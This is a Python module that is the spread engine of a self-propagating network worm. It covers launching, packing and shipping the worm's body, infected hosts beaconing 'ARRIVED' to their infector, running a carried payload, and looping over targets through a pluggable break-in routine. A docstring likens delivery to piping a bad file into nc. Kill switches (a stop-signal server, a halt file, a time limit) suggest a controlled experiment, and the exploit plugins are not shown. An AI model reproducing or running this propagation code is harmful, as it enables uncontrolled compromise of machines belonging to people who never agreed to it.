"""The spread loop. It knows nothing about holes, payloads or stop signals.

Two ways to run, chosen on the command line:

    worm launch    on the first machine: check that the break-in can work here,
                   pack the body, then attack, over and over
    worm run       on a machine the body just landed on: tell the sender we
                   arrived, do what we carried, then attack, over and over

Each round asks three questions in order: is it time to stop, who is next,
and can we break in there.
"""

import fcntl
import json
import os
import socket
import time
from pathlib import Path

from . import body, plugs
from .events import make_logger
from .spec import SLOTS, Pace, describe

LAUNCH = "launch"
ARRIVE = "run"


class Engine:
    def __init__(self, home=None):
        #: The folder holding yom_worm and the other packages: /opt/yom on the
        #: launcher, /tmp/yomw on a machine the body landed on.
        self.home = Path(home) if home else Path(__file__).resolve().parent.parent
        self.log = make_logger(self.home)
        self.done = set()                  # machines that answered us
        self.started = time.monotonic()

    # ---- the network, done for the parts ----

    @property
    def announce_port(self):
        return self.pace.announce_port

    def my_ip_toward(self, target):
        """Our own address, as the target will see it."""
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as probe:
            probe.connect((target, self.announce_port))     # sends nothing; picks our address
            return probe.getsockname()[0]

    def exchange(self, ip, port, data, wait):
        """Send, close our side, then wait for the other side.

        This is what `cat badfile | nc -w3 ip port` does.
        """
        with socket.create_connection((ip, port), timeout=5) as sock:
            sock.sendall(data)
            sock.shutdown(socket.SHUT_WR)
            sock.settimeout(wait)
            try:
                while sock.recv(4096):
                    pass
            except OSError:
                pass                       # the other side kept the line: give up after `wait`

    def deliver(self, ip, port, data) -> bool:
        """Wait for a port to start listening, then send everything to it."""
        deadline = time.monotonic() + self.pace.body_wait
        while time.monotonic() < deadline:
            try:
                with socket.create_connection((ip, port), timeout=1) as sock:
                    sock.sendall(data)
                    sock.shutdown(socket.SHUT_WR)
                    sock.settimeout(3)
                    try:
                        while sock.recv(4096):
                            pass
                    except OSError:
                        pass
                return True
            except OSError:
                time.sleep(0.3)
        return False

    def wait_answer(self, target):
        """Wait for the machine we just attacked to answer: "arrived" or "already"."""
        deadline = time.monotonic() + self.pace.announce_wait
        while time.monotonic() < deadline:
            try:
                data, sender = self.udp.recvfrom(64)
            except socket.timeout:
                continue
            if sender[0] == target:
                # A victim answers "ARRIVED", or just "A" when it was infected before.
                word = data.decode(errors="replace").strip().lower()
                return {"a": "already", "arrived": "arrived"}.get(word, word or None)
        return None

    # ---- running ----

    def run(self, mode):
        manifest = json.loads((self.home / "worm.json").read_text(encoding="utf-8"))
        registry = plugs.load(self.home, manifest.get("packages", []))
        self.manifest = manifest
        self.pace = Pace(**manifest["pace"])
        for slot in SLOTS:
            setattr(self, slot, None if manifest.get(slot) is None
                    else plugs.build(registry, slot, manifest[slot]))
        for part in [getattr(self, slot) for slot in SLOTS]:
            prepare = getattr(part, "prepare", None) if part is not None else None
            if prepare:
                prepare(self)
        self._lock()
        self._listen()
        # Every machine passes the same body onward: this folder and the settings.
        self.body = body.pack(self.home, self.manifest.get("packages", []), self._manifest_to_ship())
        if mode == LAUNCH:
            self._launch()
        else:
            self._arrive()
        self._spread()

    def _lock(self):
        """One worm per machine."""
        lock = (self.home / ".lock").open("a")
        try:
            fcntl.flock(lock, fcntl.LOCK_EX | fcntl.LOCK_NB)
        except BlockingIOError:
            print("a worm is already running on this machine")
            raise SystemExit(0)

    def _listen(self):
        """The port victims answer on."""
        self.udp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.udp.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.udp.bind(("0.0.0.0", self.announce_port))
        self.udp.settimeout(0.5)

    def _launch(self):
        check = getattr(self.entry, "check_host", None)
        if check:
            problems = check()
            if problems:
                for problem in problems:
                    print("  " + problem, flush=True)
                self.log("refused", reasons=problems)
                raise SystemExit(1)
        self._await_switch()
        self.log("launch", home=str(self.home))

    def _await_switch(self):
        """Never start before the stop-signal server has answered once."""
        if self.governor is None:
            return
        deadline = time.monotonic() + self.pace.startup_wait
        while True:
            try:
                self.governor.allowed()
                return
            except Exception as error:             # a governor that cannot tell yet
                if time.monotonic() > deadline:
                    print(str(error), flush=True)
                    self.log("halted", reason="cannot reach the stop-signal server")
                    raise SystemExit(1)
                print("waiting for the stop-signal server...", flush=True)
                time.sleep(3)

    def _manifest_to_ship(self):
        """The settings file for our children, including anything measured here."""
        ship = dict(self.manifest)
        for slot in SLOTS:
            part = getattr(self, slot)
            if part is not None:
                ship[slot] = describe(part)
        return ship

    def _arrive(self):
        os.dup2(os.open(os.devnull, os.O_RDONLY), 0)   # we came in through a connection: let it go
        infector = os.environ.get("FROM", "")
        if infector:
            for _ in range(3):
                self.udp.sendto(b"ARRIVED", (infector, self.announce_port))
                time.sleep(0.2)
        self.log("arrived", infector=infector)
        self.payload.run(self)

    def _spread(self):
        while True:
            if time.monotonic() - self.started > self.pace.max_seconds:
                return self._halt("time limit")
            if (self.home / "HALT").exists():
                return self._halt("halt file")
            if self.governor is not None:
                try:
                    if not self.governor.allowed():
                        return self._halt("stop signal")
                except Exception as error:
                    print(str(error), flush=True)
                    return self._halt("cannot reach the stop-signal server")
            target = self.scanner.next_target(self.done)
            if target is None:
                time.sleep(self.pace.attempt_delay)   # tried everyone: stay, and keep obeying the switch
                continue
            answer = self.entry.break_in(target, self.body)
            self.log("attempt", target=target, result=answer)
            if answer:
                self.done.add(target)
            time.sleep(self.pace.attempt_delay)

    def _halt(self, reason):
        self.log("halted", reason=reason)
